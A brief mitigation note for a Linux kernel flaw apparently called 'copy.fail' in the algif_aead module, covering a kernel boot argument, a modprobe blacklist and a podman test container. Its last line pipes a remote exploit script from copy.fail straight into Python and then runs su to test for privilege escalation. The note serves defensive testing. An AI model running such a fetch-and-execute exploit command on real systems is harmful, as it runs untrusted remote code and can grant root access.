# copy.fail mitigation

Kernel arg

```sh
grep algif_aead /proc/kallsyms
```

```sh
initcall_blacklist=algif_aead_init
```

/etc/modprobe.d/blacklist-algif.conf 

```config
# See https://copy.fail
blacklist algif_aead
```

Test with podman

```sh
podman build -t copy-fail .
podman run -d --rm --name copy-fail --replace copy-fail
podman exec -it copy-fail /bin/bash
```

```sh
curl https://copy.fail/exp | python3.11 && su
```
